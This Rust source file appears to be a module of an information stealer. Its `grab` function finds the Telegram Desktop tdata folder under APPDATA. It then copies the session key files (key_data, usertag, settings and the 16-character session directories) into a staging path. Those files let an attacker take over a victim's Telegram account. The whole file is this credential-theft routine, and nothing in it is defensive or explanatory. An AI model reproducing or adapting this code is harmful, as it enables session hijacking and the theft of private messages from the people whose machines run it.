use std::path::PathBuf;
use walkdir::*;

pub fn grab(path: PathBuf) -> Option<String> {
    let app_data = std::env::var("APPDATA").ok()?;

    if std::path::Path::new(&format!("{}\\Telegram Desktop\\tdata", app_data)).exists() {
        crate::utils::funcs::try_create(path.clone());
        // get all directories
        let dirs = WalkDir::new(format!("{}\\Telegram Desktop\\tdata", app_data))
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_dir());

        // get all files
        let files = WalkDir::new(format!("{}\\Telegram Desktop\\tdata", app_data))
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file());

        // copy all directories
        for dir in dirs {
            // check if directory name has 16 lenght
            if dir.file_name().to_str().unwrap().len() == 16 {
                let dir_path = dir.path().to_str().unwrap();
                let dir_path = dir_path.replace(
                    format!("{}\\Telegram Desktop\\tdata", app_data).as_str(),
                    "",
                );
                let dir_path = format!("{}{}", path.to_str().unwrap(), dir_path);
                std::fs::create_dir_all(dir_path).unwrap();
            }
        }

        // copy all files
        for file in files {
            if file.metadata().unwrap().len() > 5120 {
                continue;
            }

            if (file.file_name().to_str().unwrap().ends_with("s")
                && file.file_name().to_str().unwrap().len() == 17)
                || (file.file_name().to_str().unwrap().starts_with("usertag")
                    || file.file_name().to_str().unwrap().starts_with("settings")
                    || file.file_name().to_str().unwrap().starts_with("key_data"))
            {
                let file_path = file.path().to_str().unwrap();
                let file_path = file_path.replace(
                    format!("{}\\Telegram Desktop\\tdata", app_data).as_str(),
                    "",
                );
                let file_path = format!("{}{}", path.to_str().unwrap(), file_path);

                std::fs::copy(file.path(), file_path);
            }
        }
    }
    return Some("".to_string());
}
